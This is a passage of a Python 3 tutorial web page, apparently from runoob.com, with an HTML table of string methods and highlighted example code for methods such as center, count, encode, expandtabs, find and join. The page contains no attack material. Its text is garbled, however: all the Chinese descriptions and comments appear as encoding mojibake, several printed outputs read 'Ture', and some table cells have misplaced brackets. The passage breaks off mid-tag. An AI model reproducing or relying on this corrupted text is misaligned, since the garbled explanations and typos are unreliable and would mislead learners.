å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«è‡³å°‘ä¸€ä¸ªåŒºåˆ†å¤§å°å†™çš„å­—ç¬¦ï¼Œå¹¶ä¸”æ‰€æœ‰è¿™äº›(åŒºåˆ†å¤§å°å†™çš„)å­—ç¬¦éƒ½æ˜¯å°å†™ï¼Œåˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isnumeric.html">isnumeric()</a> å¦‚æœå­—ç¬¦ä¸²ä¸­åªåŒ…å«æ•°å­—å­—ç¬¦ï¼Œåˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</td></tr><tr><td align="left">15</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isspace.html">isspace()</a> å¦‚æœå­—ç¬¦ä¸²ä¸­åªåŒ…å«ç©ºç™½ï¼Œåˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False.</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-istitle.html">istitle()</a> å¦‚æœå­—ç¬¦ä¸²æ˜¯æ ‡é¢˜åŒ–çš„(è§ title())åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isupper.html">isupper()</a> å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«è‡³å°‘ä¸€ä¸ªåŒºåˆ†å¤§å°å†™çš„å­—ç¬¦ï¼Œå¹¶ä¸”æ‰€æœ‰è¿™äº›(åŒºåˆ†å¤§å°å†™çš„)å­—ç¬¦éƒ½æ˜¯å¤§å†™ï¼Œåˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-join.html">join(seq)</a> ä»¥æŒ‡å®šå­—ç¬¦ä¸²ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå°† seq ä¸­æ‰€æœ‰çš„å…ƒç´ (çš„å­—ç¬¦ä¸²è¡¨ç¤º)åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html">len(string)</a> è¿”å›å­—ç¬¦ä¸²é•¿åº¦</td></tr><tr><td align="left">20</td><td align="left">[ljust(width<a href="https://www.runoob.com/python3/python3-string-ljust.html">, fillchar])</a> è¿”å›ä¸€ä¸ªåŸå­—ç¬¦ä¸²å·¦å¯¹é½,å¹¶ä½¿ç”¨ fillchar å¡«å……è‡³é•¿åº¦ width çš„æ–°å­—ç¬¦ä¸²ï¼Œfillchar é»˜è®¤ä¸ºç©ºæ ¼ã€‚</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lower.html">lower()</a> è½¬æ¢å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å¤§å†™å­—ç¬¦ä¸ºå°å†™.</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lstrip.html">lstrip()</a> æˆªæ‰å­—ç¬¦ä¸²å·¦è¾¹çš„ç©ºæ ¼æˆ–æŒ‡å®šå­—ç¬¦ã€‚</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-maketrans.html">maketrans()</a> åˆ›å»ºå­—ç¬¦æ˜ å°„çš„è½¬æ¢è¡¨ï¼Œå¯¹äºæ¥å—ä¸¤ä¸ªå‚æ•°çš„æœ€ç®€å•çš„è°ƒç”¨æ–¹å¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºéœ€è¦è½¬æ¢çš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¹Ÿæ˜¯å­—ç¬¦ä¸²è¡¨ç¤ºè½¬æ¢çš„ç›®æ ‡ã€‚</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-max.html">max(str)</a> è¿”å›å­—ç¬¦ä¸² str ä¸­æœ€å¤§çš„å­—æ¯ã€‚</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-min.html">min(str)</a> è¿”å›å­—ç¬¦ä¸² str ä¸­æœ€å°çš„å­—æ¯ã€‚</td></tr><tr><td align="left">26</td><td align="left">[replace(old, new <a href="https://www.runoob.com/python3/python3-string-replace.html">, max])</a> æŠŠ å°†å­—ç¬¦ä¸²ä¸­çš„ old æ›¿æ¢æˆ new,å¦‚æœ max æŒ‡å®šï¼Œåˆ™æ›¿æ¢ä¸è¶…è¿‡ max æ¬¡ã€‚</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rfind.html">rfind(str, beg=0,end=len(string))</a> ç±»ä¼¼äº find()å‡½æ•°ï¼Œä¸è¿‡æ˜¯ä»å³è¾¹å¼€å§‹æŸ¥æ‰¾.</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rindex.html">rindex( str, beg=0, end=len(string))</a> ç±»ä¼¼äº index()ï¼Œä¸è¿‡æ˜¯ä»å³è¾¹å¼€å§‹.</td></tr><tr><td align="left">29</td><td align="left">[rjust(width,<a href="https://www.runoob.com/python3/python3-string-rjust.html">, fillchar])</a> è¿”å›ä¸€ä¸ªåŸå­—ç¬¦ä¸²å³å¯¹é½,å¹¶ä½¿ç”¨fillchar(é»˜è®¤ç©ºæ ¼ï¼‰å¡«å……è‡³é•¿åº¦ width çš„æ–°å­—ç¬¦ä¸²</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rstrip.html">rstrip()</a> åˆ é™¤å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼æˆ–æŒ‡å®šå­—ç¬¦ã€‚</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-split.html">split(str=â€â€, num=string.count(str))</a> ä»¥ str ä¸ºåˆ†éš”ç¬¦æˆªå–å­—ç¬¦ä¸²ï¼Œå¦‚æœ num æœ‰æŒ‡å®šå€¼ï¼Œåˆ™ä»…æˆªå– num+1 ä¸ªå­å­—ç¬¦ä¸²</td></tr><tr><td align="left">32</td><td align="left">[splitlines(<a href="https://www.runoob.com/python3/python3-string-splitlines.html">keepends])</a> æŒ‰ç…§è¡Œ(â€˜\râ€™, â€˜\r\nâ€™, \nâ€™)åˆ†éš”ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å„è¡Œä½œä¸ºå…ƒç´ çš„åˆ—è¡¨ï¼Œå¦‚æœå‚æ•° keepends ä¸º Falseï¼Œä¸åŒ…å«æ¢è¡Œç¬¦ï¼Œå¦‚æœä¸º Trueï¼Œåˆ™ä¿ç•™æ¢è¡Œç¬¦ã€‚</td></tr><tr><td align="left">33</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-startswith.html">startswith(substr, beg=0,end=len(string))</a> æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸² substr å¼€å¤´ï¼Œæ˜¯åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚å¦‚æœbeg å’Œ end æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ã€‚</td></tr><tr><td align="left">34</td><td align="left">[strip(<a href="https://www.runoob.com/python3/python3-string-strip.html">chars])</a> åœ¨å­—ç¬¦ä¸²ä¸Šæ‰§è¡Œ lstrip()å’Œ rstrip()</td></tr><tr><td align="left">35</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-swapcase.html">swapcase()</a> å°†å­—ç¬¦ä¸²ä¸­å¤§å†™è½¬æ¢ä¸ºå°å†™ï¼Œå°å†™è½¬æ¢ä¸ºå¤§å†™</td></tr><tr><td align="left">36</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-title.html">title()</a> è¿”å›â€æ ‡é¢˜åŒ–â€çš„å­—ç¬¦ä¸²,å°±æ˜¯è¯´æ‰€æœ‰å•è¯éƒ½æ˜¯ä»¥å¤§å†™å¼€å§‹ï¼Œå…¶ä½™å­—æ¯å‡ä¸ºå°å†™(è§ istitle())</td></tr><tr><td align="left">37</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-translate.html">translate(table, deletechars=â€â€)</a> æ ¹æ® str ç»™å‡ºçš„è¡¨(åŒ…å« 256 ä¸ªå­—ç¬¦)è½¬æ¢ string çš„å­—ç¬¦, è¦è¿‡æ»¤æ‰çš„å­—ç¬¦æ”¾åˆ° deletechars å‚æ•°ä¸­</td></tr><tr><td align="left">38</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-upper.html">upper()</a> è½¬æ¢å­—ç¬¦ä¸²ä¸­çš„å°å†™å­—æ¯ä¸ºå¤§å†™</td></tr><tr><td align="left">39</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-zfill.html">zfill (width)</a> è¿”å›é•¿åº¦ä¸º width çš„å­—ç¬¦ä¸²ï¼ŒåŸå­—ç¬¦ä¸²å³å¯¹é½ï¼Œå‰é¢å¡«å……0</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdecimal.html">isdecimal()</a> æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦åªåŒ…å«åè¿›åˆ¶å­—ç¬¦ï¼Œå¦‚æœæ˜¯è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</td></tr></tbody></table><h3 id="å‡½æ•°ç¤ºä¾‹-1"><a href="#å‡½æ•°ç¤ºä¾‹-1" class="headerlink" title="å‡½æ•°ç¤ºä¾‹"></a>å‡½æ•°ç¤ºä¾‹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.capitalize() : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>capitalize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.capitalize() :  This is string example from runoob....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"[runoob]"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.center(40, '*') : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.center(40, '*') :  ****************[runoob]****************</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"www.runoob.com"</span>sub <span class="token operator">=</span> <span class="token string">'o'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.count('o') : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>sub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.count('o') :  3</span>sub <span class="token operator">=</span> <span class="token string">'run'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.count('run', 0, 10) : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>sub<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.count('run', 0, 10) :  1</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"èœé¸Ÿæ•™ç¨‹"</span>str_utf8 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span>str_gbk <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"GBK"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># èœé¸Ÿæ•™ç¨‹</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"UTF-8 ç¼–ç ï¼š"</span><span class="token punctuation">,</span> str_utf8<span class="token punctuation">)</span><span class="token comment"># UTF-8 ç¼–ç ï¼š b'\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"GBK ç¼–ç ï¼š"</span><span class="token punctuation">,</span> str_gbk<span class="token punctuation">)</span><span class="token comment"># GBK ç¼–ç ï¼š b'\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"UTF-8 è§£ç ï¼š"</span><span class="token punctuation">,</span> str_utf8<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'UTF-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># UTF-8 è§£ç ï¼š èœé¸Ÿæ•™ç¨‹</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"GBK è§£ç ï¼š"</span><span class="token punctuation">,</span> str_gbk<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'GBK'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># GBK è§£ç ï¼š èœé¸Ÿæ•™ç¨‹</span>Str <span class="token operator">=</span> <span class="token string">'Runoob example....wow!!!'</span>suffix <span class="token operator">=</span> <span class="token string">'!!'</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span>suffix <span class="token operator">=</span> <span class="token string">'run'</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob\t12345\tabc"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'åŸå§‹å­—ç¬¦ä¸²:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># åŸå§‹å­—ç¬¦ä¸²: runoob12345abc</span><span class="token comment"># é»˜è®¤ 8 ä¸ªç©ºæ ¼</span><span class="token comment"># runnob æœ‰ 6 ä¸ªå­—ç¬¦ï¼Œåé¢çš„ \t å¡«å…… 2 ä¸ªç©ºæ ¼</span><span class="token comment"># 12345 æœ‰ 5 ä¸ªå­—ç¬¦ï¼Œåé¢çš„ \t å¡«å…… 3 ä¸ªç©ºæ ¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'æ›¿æ¢ \\t ç¬¦å·:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ›¿æ¢ \t ç¬¦å·: runoob  12345   abc</span><span class="token comment"># 2 ä¸ªç©ºæ ¼</span><span class="token comment"># runnob æœ‰ 6 ä¸ªå­—ç¬¦ï¼Œåˆšå¥½æ˜¯ 2 çš„ 3 å€ï¼Œåé¢çš„ \t å¡«å…… 2 ä¸ªç©ºæ ¼</span><span class="token comment"># 12345 æœ‰ 5 ä¸ªå­—ç¬¦ï¼Œä¸æ˜¯ 2 çš„å€æ•°ï¼Œåé¢çš„ \t å¡«å…… 1 ä¸ªç©ºæ ¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ä½¿ç”¨ 2 ä¸ªç©ºæ ¼æ›¿æ¢ \\t ç¬¦å·:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä½¿ç”¨ 2 ä¸ªç©ºæ ¼æ›¿æ¢ \t ç¬¦å·: runoob  12345 abc</span><span class="token comment"># 3 ä¸ªç©ºæ ¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ä½¿ç”¨ 3 ä¸ªç©ºæ ¼:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä½¿ç”¨ 3 ä¸ªç©ºæ ¼: runoob   12345 abc</span><span class="token comment"># 4 ä¸ªç©ºæ ¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ä½¿ç”¨ 4 ä¸ªç©ºæ ¼:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä½¿ç”¨ 4 ä¸ªç©ºæ ¼: runoob  12345   abc</span><span class="token comment"># 5 ä¸ªç©ºæ ¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ä½¿ç”¨ 5 ä¸ªç©ºæ ¼:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä½¿ç”¨ 5 ä¸ªç©ºæ ¼: runoob    12345     abc</span><span class="token comment"># 6 ä¸ªç©ºæ ¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ä½¿ç”¨ 6 ä¸ªç©ºæ ¼:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä½¿ç”¨ 6 ä¸ªç©ºæ ¼: runoob      12345 abc</span>str1 <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"exam"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># -1</span>str1 <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"exam"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token comment"># print(str1.index(str2, 10))  # å¼‚å¸¸</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob2016"</span>  <span class="token comment"># å­—ç¬¦ä¸²æ²¡æœ‰ç©ºæ ¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"www.runoob.com"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token comment"># å­—æ¯å’Œä¸­æ–‡æ–‡å­—</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoobèœé¸Ÿæ•™ç¨‹"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"RUNOOB example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob2016"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"23443434"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"       "</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"This Is String Example...Wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>istitle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"This is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>istitle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"THIS IS STRING EXAMPLE....WOW!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"THIS is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span>s1 <span class="token operator">=</span> <span class="token string">"-"</span>s2 <span class="token operator">=</span> <span class="token string">""</span>seq <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span>  <span class="token comment"># å­—ç¬¦ä¸²åºåˆ—</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>join<span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># r-u-n-o-o-b</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">.</span>join<span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># runoob</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å­—ç¬¦ä¸²é•¿åº¦</span><span class="token comment"># 6</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob example....wow!!!**************************</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob EXAMPLE....WOW!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># runoob example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"     this is string example....wow!!!     "</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"88888888this is string example....wow!!!8888888"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># this is string example....wow!!!8888888</span>intab <span class="token operator">=</span> <span class="token string">"aeiou"</span>outtab <span class="token operator">=</span> <span class="token string">"12345"</span>trantab <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>intab<span class="token punctuation">,</span> outtab<span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span>trantab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># th3s 3s str3ng 2x1mpl2....w4w!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æœ€å¤§å­—ç¬¦: "</span> <span 